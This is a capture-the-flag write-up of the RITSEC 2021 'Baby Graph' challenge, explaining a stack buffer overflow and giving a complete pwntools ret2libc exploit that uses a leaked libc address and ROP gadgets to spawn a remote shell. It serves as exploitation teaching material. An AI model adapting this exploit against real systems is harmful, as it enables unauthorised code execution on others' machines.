---
layout: post
title: "RITSEC 2021 - Baby Graph [Pwn]"
categories: ctf
tags: ikerl ret2lib buffer-overflow
date: 2021-04-12 21:08:00 +0200
author: ikerl
---

In this challenge we are given an ELF64 binary. The challenge consists of getting remote code execution and reading the flag. We need to determine whether a given graph is Eulerian to get a prize (leaked libc pointer), and therefore exploit a buffer overflow vulnerability.

With `checksec` we see that the binary is compiled without the PIE and stack canary mitigations. We cannot run a shellcode in the stack, but we can use several ROP gadgets. We are given the full source code, which you can check [here](https://gist.github.com/ikerl/e0ce3980fa55259f2056d9f882f7d912).

```
$ checksec ./babygraph
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

In the source code, there is a suspicious function called `vuln`. This function does not properly check bounds when receiving user input, so we can abuse this vulnerability and take control of the program execution flow.

```c
void vuln() {
    char buf[100];

    printf("Here is your prize: %p\n", system);
    fgets(buf, 400, stdin);
}
```

In order for this function to be executed, we must answer correctly 5 questions; these questions imply determining wheter a given graph is Eulerian or not. In order to save time, instead of properly determining the correct answer, we used the following heuristic based on the number of lines given for the graph:

```python
def checkYesOrNo(lines):
    if len(str(lines).split("\n")) > 1:
        result = "N"
    else:
        result = "Y"
    return result
```

This solution is not perfect, but it succeeds around 50% of the time. Once we get to the vulnerable function and we are rewarded with the libc leak, we can craft a ROP chain to execute a ret2lib attack and get a shell. We need to note two things:
	- We can easily calculate the `execl`, `/bin/sh` and `exit` addresses in memory using a leaked libc address.
	- We cannot use the `system` function because the given libc's function does not work.

```python
#!/bin/python
from pwn import *

def checkYesOrNo(lines):
    if len(str(lines).split("\n")) > 1:
        result = "N"
    else:
        result = "Y"
    return result

io = remote("challenges1.ritsec.club",1339)

elf = ELF('./babygraph')
libc = ELF("./libc.so.6")

for _ in range(5):
	lines = io.recvuntil("(Y/N)\n")
	io.sendline(checkYesOrNo(lines.decode()))

io.recvuntil("prize: ")
recieved = io.readline().strip()

offset_execl = libc.symbols["execl"] - libc.symbols["system"]
offset_binsh = next(libc.search(b'/bin/sh')) - libc.symbols["system"]
offset_exit = libc.symbols["exit"] - libc.symbols["system"]

# GADGETS:
# 0x00000000004017c1: pop rsi; pop r15; ret;
# 0x00000000004017c3: pop rdi; ret;

io.sendline(120*b"A" + p64(0x4017c3) + p64(int(recieved.decode().replace("0x",""),16) + offset_binsh) + p64(0x4017c1) + b"\x00"*8 + b"\x00"*8 + p64(int(recieved.decode().replace("0x",""),16) + offset_execl) + p64(int(recieved.decode().replace("0x",""), 16) + offset_exit))

io.interactive()
```

The exploit scripts gives us a remote shell, which we can use to get the flag:
`RS{B4by_gr4ph_du_DU_dU_Du_B4by_graph_DU_DU_DU_DU_Baby_gr4ph}`
